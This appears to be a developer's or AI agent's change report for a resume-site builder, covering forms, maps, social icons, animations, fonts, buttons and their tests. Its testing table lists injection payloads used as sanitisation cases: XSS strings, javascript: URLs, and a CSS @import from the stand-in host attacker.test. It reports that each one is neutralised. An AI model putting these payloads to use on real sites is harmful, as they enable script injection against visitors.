# The rest of the list: forms, maps, social, animations, fonts, buttons

All six are built. **736 source assertions** and **114 browser assertions** at 1440px and 390px, 0 failures.

Some of this was already half-built and unreachable, which is worth saying up front rather than claiming six features from nothing.

---

## 1. Forms

**Was there:** a `form` element, a `site_leads` table, a submission endpoint, and an email to the owner.
**Was not:** any way to change the fields, and anywhere in the product to *read* what came in.

- **Configurable fields** in the gear panel: label, type (text / email / long / phone), add, remove. Up to eight.
- **One field is fixed: email.** The server needs a valid visitor address to store a lead and to let you reply, so a form without one collects nothing. Removing it would be quietly breaking your own contact page, so the row is locked and marked 🔒. If a document arrives without one, the renderer inserts it.
- **Custom answers travel with the lead.** `name` / `email` / `message` keep their own columns because the leads list and the notification email were built around them; anything you add lands in an `extra` column and appears in both.
- **A new Back Office card, "Messages from your website."** Newest first, custom fields under their own labels, and a Reply button that opens your mail client. Submissions were being stored and emailed from the day the form element existed and there was nowhere in the product to read them — so a message arriving while your email was misconfigured was, from your side, a message that never came.

## 2. Maps

New `map` element. Type an address, set the zoom on a slider, size it like any other element.

Google's keyless embed, so there is no API key and no billing account to set up. Loaded lazily, so a map never delays the page. **A map with no address is invisible to visitors** and shows "Add an address" to you — publishing "Add an address" on your own portfolio is worse than publishing nothing.

## 3. Social

**Was there:** a `social` element that rendered two letters of text in a circle.
**Now:**

- **Eleven platforms with real icons** — LinkedIn, GitHub, X, Instagram, Facebook, YouTube, Dribbble, Behance, Medium, Website, Email — as inline SVG, not a webfont. A published site is one self-contained document, and a font request for eight glyphs is a request that can fail and leave empty squares where your LinkedIn should be.
- **A handle or a URL.** Type `marvinperson` in the LinkedIn row and it becomes `linkedin.com/in/marvinperson`. Paste the whole address and that is used verbatim. Both are the same intention.
- **Two displays, one set of data:** a row of icon buttons, or "Find me on LinkedIn" as a link. Switching between them never loses what you typed.

## 4. Animations

One toggle per section — **Animate on scroll** — plus a choice of Slide up, Fade in, or Gentle zoom. Off by default.

Three options and no timing controls, deliberately. This is a resume site: an entrance that draws attention to itself works against the person whose name is on it.

- **Nothing animates on the canvas.** An element that faded in on every re-render would flicker under your hands while you work. The panel says so and points you at your live site.
- **`prefers-reduced-motion` is honoured** — someone who asked their machine for less motion gets none.
- **The invisible starting state is gated behind a class the script sets.** Without that, a visitor with JavaScript off — or a crawler — would be served a page whose content is permanently invisible.
- Anything already on screen at load reveals immediately, rather than waiting for a scroll that may never come on a short page.

## 5. Custom fonts

Fifteen Google Fonts in the Brand tab — ten sans, five serif — with **separate heading and body pickers** and a one-press "use the heading font for both".

Inter · DM Sans · Manrope · Work Sans · IBM Plex Sans · Source Sans 3 · Nunito Sans · Karla · Space Grotesk · Figtree · Merriweather · Lora · Source Serif 4 · Playfair Display · Libre Baskerville

A curated list, not a free-text family name — a font name goes into a Google Fonts URL and a CSS `font-family` on a public page, so anything not on the list is ignored and the template's own font stands. One stylesheet request for whatever the page actually uses.

## 6. Buttons

**Was there:** text, link, page link, filled/outline.
**Added:** a colour picker with a "back to the theme" reset, and three ready-made buttons in the palette — **Download my resume**, **Email me**, **Book a call**.

An outline button takes the colour on its **border and its text**, not its background — coloured only on the background it would be invisible.

---

## 7. What I spent the testing on

The happy path for all six is the easy half. `test/site-features.js` is mostly the other half, because every one of these ends up in a `style` attribute, a URL, or an `<iframe src>` on a page the world can load:

| | |
|---|---|
| A map address containing `" onload="alert(1)" x="<script>` | percent-encoded in the URL, entity-escaped in the title, cannot leave its attribute |
| Zoom of `9999` or `-5` | clamped to 20 and 1 |
| A social URL of `javascript:alert(1)` | dropped — and the rest of the row still renders |
| A `tel:` link | **this one I broke and caught.** An earlier version tested for `http`/`mailto` specifically and turned a working `tel:+1555…` into `https://tel:+1555…`. Any scheme now passes through to the existing safe-URL check |
| A form field named `a b!@#` | sanitised to `ab` |
| A field type of `nonsense` | falls back to text rather than emitting itself |
| Two fields with the same key | collapse, so one answer cannot overwrite another |
| A label of `<img src=x onerror=alert(1)>` | escaped to text |
| An extras payload with nested objects and odd keys | filtered, not stored whole |
| A font named `Evil");@import url(//attacker.test/x.css);a{b:"` | falls back to Inter; nothing of it reaches the stylesheet URL |
| A button colour of `red; background:url(javascript:1)` | ignored |

## 8. In the browser, at both widths

114 assertions, 1440px and 390px. The six checked through the panel a user actually operates, then **read back off the rendered page inside the canvas** — the document agreeing with itself proves nothing about what the page shows:

- A typed address reaches the map embed, at the chosen zoom
- A bare social handle becomes `https://www.linkedin.com/in/marvinperson`, with a real `<svg>`
- A field added in the panel appears on the form; the email field cannot be removed
- A button's colour is read back as `rgb(225, 29, 72)` from `getComputedStyle`
- Choosing Playfair + Karla changes what the page is **set in**, and both are requested in one stylesheet
- The animation toggle writes the section, and the canvas still does not animate

Two harness bugs found and fixed on the way, both of which had made the product look broken:

- `addInitScript` runs in **every frame**. Once a map existed the page contained a cross-origin `maps.google.com` iframe where storage is denied, so seeding the session there threw a SecurityError that read as a product fault. Top frame only now.
- The font check was reading the `<link rel="preconnect">`, which matches the same host as the stylesheet and carries no families.

## 9. One test I rewrote rather than satisfied

`element-library.js` asserted that every palette entry renders something for a **visitor**. A map with no address and social buttons with no handles correctly render nothing there — so the rule was wrong, not the code.

It now asserts both halves separately, which is what was actually meant:

- **Every palette entry draws something for the OWNER**, because an element that renders nothing on the canvas reads as a feature that failed. (One documented exception: an empty photo slot, deliberately invisible everywhere.)
- **Nothing half-finished reaches a VISITOR**, because publishing "Add an address" is worse than publishing nothing.

## 10. When you test

Everything is in the editor: the **⚙** on a selected element for forms, maps, social, buttons and the section animation toggle; the **Brand** tab in the left rail for fonts; **Back Office → Messages from your website** for submissions.

Worth knowing: **animations only show on your live site**, not on the canvas. That is deliberate, and the panel says so, but it is the one thing that could look like it did not work.
